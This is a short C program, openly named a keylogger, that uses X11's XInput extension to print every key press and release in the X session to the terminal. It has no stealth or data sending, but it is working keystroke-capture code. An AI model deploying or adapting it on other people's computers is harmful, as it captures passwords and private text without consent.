/* -*- compile-command: "gcc keylogger.c -Wall -pedantic -lX11 -lXi -o keylogger" -*- */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/extensions/XInput.h>

static int KEY_PRESS_TYPE;
static int KEY_RELEASE_TYPE;

static void process_event( XDeviceKeyEvent *event )
{
    KeySym keysym = XKeycodeToKeysym( event->display , event->keycode , 0 );
    printf( "%s %s\n" ,
            event->type == KEY_PRESS_TYPE ? "press" : "release" ,
            XKeysymToString( keysym ) );
}

static int get_keybord_id( Display *display , XID *xid )
{
    int i , n;
    XDeviceInfo *devices;

    /* get all input devices */
    devices = XListInputDevices( display , &n );

    for ( i = 0 ; i < n ; i++ )
    {
        /* tries to guess the real ketboard */
        if ( devices[i].use == IsXExtensionKeyboard &&
             strcmp( devices[i].name , "Virtual core XTEST keyboard" ) != 0 &&
             strcmp( devices[i].name , "Power Button" ) != 0 )
        {
            *xid = devices[i].id;
            return 1;
        }
    }

    XFreeDeviceList( devices );
    return 0;
}

int main( int argc , char *argv[] )
{
    Display *display;
    int screen;
    Window root;
    XID keyboard_id;
    XDevice *device;
    XEventClass event_class[ 2 ];

    /* open display */
    if ( display = XOpenDisplay( NULL ) , !display )
    {
        fprintf( stderr , "Cannot open display" );
        return EXIT_FAILURE;
    }

    /* get variables */
    screen = DefaultScreen( display );
    root = RootWindow( display , screen );

    /* lookup the keyboard */
    if ( !get_keybord_id( display , &keyboard_id ) )
    {
        fprintf( stderr , "No keyboards found" );
        return EXIT_FAILURE;
    }

    /* open device */
    if ( device = XOpenDevice( display , keyboard_id ), !device )
    {
        fprintf( stderr , "Cannot open device" );
        return EXIT_FAILURE;
    }

    /* register events */
    DeviceKeyPress( device , KEY_PRESS_TYPE , event_class[ 0 ] );
    DeviceKeyRelease( device , KEY_RELEASE_TYPE , event_class[ 1 ] );
    XSelectExtensionEvent( display , root , event_class , 2 );

    /* event loop */
    while ( 1 )
    {
        XEvent event;

        /* process the next event */
        XNextEvent( display , &event );
        process_event( ( XDeviceKeyEvent * )&event );
    }
}
